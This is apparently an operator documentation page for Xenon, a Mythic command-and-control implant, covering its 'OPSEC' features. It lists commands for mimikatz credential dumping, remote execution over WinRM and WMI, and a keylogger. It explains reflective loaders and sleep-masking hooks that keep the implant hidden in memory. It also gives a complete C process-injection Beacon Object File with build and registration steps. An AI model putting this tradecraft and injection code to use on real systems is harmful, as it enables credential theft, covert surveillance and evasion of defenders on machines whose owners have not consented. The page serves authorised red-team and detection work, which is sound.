+++
title = "OPSEC"
chapter = false
weight = 20
pre = "<b>3. </b>"
+++

![logo](/agents/xenon/Xenon.png?width=600px)

## Fork & Run Commands
These commands spawn a sacrificial process to perform their actions and call `inject_shellcode`. 
They are compatible with Cobalt Strike's Process Injection Kits.

| Command                  | Usage                                                         | Description |
|--------------------------|---------------------------------------------------------------|-------------|
| `mimikatz`          | `mimikatz [args]`                                               | Execute mimikatz on the host. (e.g., mimikatz sekurlsa::logonpasswords) OPSEC Warning: Uses donut shellcode. |
| `execute_assembly` | `execute_assembly -Assembly [SharpUp.exe] [-Arguments [assembly arguments]]` | Execute a .NET Assembly in a remote processes and retrieve the output. OPSEC Warning: Uses donut shellcode. |
| `powerchell` | `powerchell -Command <command>` | Execute PowerShell script using PowerChell post-ex DLL. |

## Lateral Movement Commands
These commands execute Beacon Object Files inline in the current agent process via `inline_execute`. They do not spawn a sacrificial process.

| Command                  | Usage                                                         | Description |
|--------------------------|---------------------------------------------------------------|-------------|
| `remote_exec` | `remote_exec -Module [module] -Target [target] -Command [command + args] [-Domain [domain]] [-Username [username]] [-Password [password]]` | Execute a command on a remote machine. Supported modules: `winrm`, `wmi`, `scshell`. |

## Async BOF Commands
These commands run Beacon Object Files in a background thread. Output streams to the Mythic task while the job runs. Use `jobkill <task_uuid>` to stop (list UUIDs with `jobs`).

| Command | Usage | Description |
|---------|-------|-------------|
| `async_execute` | `async_execute -BOF [COFF.o] [-Arguments ...]` | Generic async BOF runner. |
| `usermon` | `usermon [-Interval 3000]` | Poll WTS sessions for new interactive logons. |
| `keylogger` | `keylogger [-Interval 30000]` | Poll key state and dump buffered keystrokes on an interval. |
| `jobs` / `jobkill` | `jobs` / `jobkill <task_uuid>` | List or stop async jobs. |

## User-Defined Reflective Loader (UDRL)
In previous versions, Xenon used donut-shellcode to generate shellcode from its DLL output type. That has changed.
Now by default, Xenon uses a simple reflective DLL loader based on the [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) linker created by Raphael Mudge.

Additionally, operators can now define their own reflective DLL loader during the build process for the `shellcode` output type. The loader must be based on the Crystal Palace linker.

Once enabled and uploaded, Mythic will:
1. Compile the Xenon agent DLL
2. Unzip the UDRL
3. Compile the UDRL with `make`
4. Use the Crystal Palace linker to create a PIC blob (UDRL + DLL)

### How to use

Find the default Crystal Palace RDL that comes with Xenon [here](https://github.com/nickswink/crystal-simple-loader).

> [!IMPORTANT]
> To use your own crystal palace RDL you must zip the source and upload.

```bash
# Clone basic loader
git clone https://github.com/nickswink/crystal-simple-loader.git

cd crystal-simple-loader

# << Make your changes >>

# Zip directory
zip -r loader.zip .

# Upload loader.zip during Xenon build process
```

As stated before, the loader must be uploaded as a ZIP file. Your loader must follow a basic format with at least the following:
- `Makefile` - default build command as `make`
- `loader.spec`
- Any source files needed to build the loader

An example of a directory tree for the simple loader that comes with Xenon looks like this:
```
.
├── Makefile
├── libtcg.x64.zip
├── loader.spec
└── src
    ├── loaddll.c
    ├── loader.c
    ├── loaderdefs.h
    └── tcg.h
```

#### Makefile
This is an example makefile from the Crystal Palace RDL examples. 
```makefile
CC_64=x86_64-w64-mingw32-gcc

all: bin/loader.x64.o

bin:
	mkdir bin

bin/loader.x64.o: bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/loader.c -o bin/loader.x64.o

clean:
	rm -f bin/*
```

#### Spec File
The `loader.spec` file is a key linker file specific to Crystal Palace. It tells the Crystal Palace linker details about how to create our PIC.
```yaml
x64:
	load "bin/loader.x64.o"       # read the loader COFF
		make pic +gofirst          # turn it into PIC and ensure the go function is at the start
		dfr "resolve" "ror13"      # use ror13 with the resolve method for resolving dfr functions
		mergelib "libtcg.x64.zip"  # merge the shared library

		# read the dll being provided
		push $DLL
		# link it to the "dll" section in the loader
		link "dll"

		# export the final pic
		export
```


### Development
If you want to modify/create your own reflective loader I highly recommend watching the overview videos from Raphael [here](https://tradecraftgarden.org/videos.html).

[Rasta Mouse](https://github.com/rasta-mouse) also has some great resources more specifically for Cobalt Strike in [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit).

### Sleep masking (Crystal Palace IAT hooks)

HTTPX C2 idle always goes through a real `kernel32` IAT import so a UDRL can intercept it the same way Crystal Kit hooks Beacon's `Sleep`.

To apply sleep masking to Xenon you must hook **`SleepEx(dwMilliseconds, TRUE)`**, not `Sleep` or `WaitForSingleObject`.

Hook it at import resolution time:

```text
addhook "KERNEL32$SleepEx" "_SleepEx"
```

The hook must match `DWORD SleepEx(DWORD dwMilliseconds, BOOL bAlertable)`: mask memory, call the real `SleepEx` with the same arguments, unmask, and **return the wait status**. Leave the wait alertable. `BeaconWakeup` queues an APC on the beacon thread so `SleepEx(..., TRUE)` can return early (`WAIT_IO_COMPLETION`) when an async BOF has output. Swallowing that wakeup stalls async output until the full sleep expires. The APC trampoline is a one-byte `ret` in `VirtualAlloc`, not a Xenon `.text` gadget, so it is safe if it runs while the image is still masked.

Do **not** globally `addhook` `WaitForSingleObject` / `WaitForMultipleObjects` for sleep masking. Xenon uses those APIs for mutexes, thread joins, and other sync. Masking around every wait can deadlock. `Sleep` is called in shell/link and the DLL export keep-alive loop, **dont** hook `Sleep()` for sleep-masking.

WebSocket is not currently compatible with sleep masking and uses `WaitForMultipleObjects` (inbound frame + async wakeup event).

SMB/TCP are unchanged. Only HTTPX (and WebSocket reconnect backoff via `SleepWithJitter`) will benefit from sleep masking with `SleepEx`.

### Async BOFs while the image is masked

Long-running jobs (`usermon`, `keylogger`, `async_execute`) keep running during `SleepEx`. Their COFF `.text` is already `VirtualAlloc` and is not XOR'd, but `Beacon*` imports would otherwise jump into the encrypted Xenon DLL.

For each async job Xenon copies a small PIC Beacon stub island into `VirtualAlloc` (not heap-tracked) and binds that job's COFF imports there:

- `BeaconPrintf` / `BeaconOutput` write a ring buffer in the island; the beacon thread drains it after unmask
- `BeaconWakeup` uses `SetEvent` + `QueueUserAPC` with handles stored in the island
- `BeaconGetStopJobEvent`, `BeaconData*`, `BeaconFormat*`, token helpers
- `KERNEL32$` / `MSVCRT$` imports are resolved from the export table (not hooked `GetProcAddress`) so BOF `LocalAlloc` buffers are not heap-tracked

The job thread starts in the island, not in Xenon `.text`. Map/relocate happens on the beacon thread while the image is still plaintext. `BeaconIsAdmin` / spawn / inject stay bound to the DLL. Do not call those from a job that must survive sleep.


## User-Defined Post-Ex Loader
The UDRL for post-ex DLLs is a Crystal Palace PICO used to boostrap a post-ex DLL for execution. The default post-ex loader can be found under `xenon/agent_code/Loader/post-ex`.

This loader is used any time the agent is sent a task that uses a post-ex DLL. Currently these are the only commands that use post-ex DLLs.

- `powerchell`

### Overriding Default Post-Ex Loader



## Process Injection Kit
You can read about Cobalt Strike's Process Injection Kit [here](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5).
It allows the operator to modify the default behavior for Fork & Run post-ex commands. This provided the flexibility needed and allowed operators to Bring Your Own Process Injection.
Xenon's default process injection technique is the classic APC injection.
It follows a well signatured process of: `CreateProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `QueueUserAPC`, and finally `ResumeThread`.

### Bring Your Own Process Injection
The command `register_process_inject_kit` allows you to enable a custom process injection technique in the running payload. Process Injection Kit's are implemented as Beacon Object Files (BOFs) and applied through the modal.

Currently only **PROCESS_INJECT_SPAWN** is implemented which spawns a sacrificial process to perform process injection.

Here is a basic example from [Cobalt Strike](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5):
```C
#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Ready to go: spawn, inject and cleanup */
   if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }
   BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
   BeaconCleanupProcess(&pi);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
```
This example is represents Xenon's default process injection technique implemented as a BOF under `xenon/agent_code/Loader/inject-kits`. It can be easily modified to change the injection behavior to something custom, and that's where the advantage is. Additionally, with `register_process_inject_kit` the injection behavior can be changed an infinite amount in the running payload without compiling a new payload.

**NOTE** - The registered process injection kit will apply globally to **ALL** instances of Xenon, not just the callback you submitted the register command in.

You can compile this as a BOF with the following:
```
x86_64-w64-mingw32-gcc -o inject_spawn.x64.o -c inject_spawn.c 
```
Then register the new kit with the `register_process_inject_kit` command to the Mythic server. Now commands that call `inject_shellcode` will use your new process injection behavior!

### Examples
Here are some real-world examples of modified injection kits:
- [InjectKit](https://github.com/REDMED-X/InjectKit) - Indirect syscalls via the Tartarus' Gate method.
- [secinject](https://github.com/apokryptein/secinject) - Section Mapping Process Injection (secinject): Cobalt Strike BOF 
- [CB_process_Inject](https://github.com/vgeorgiev90/CB_process_Inject) - A simple process injection kit for cobalt strike based on syscalls 

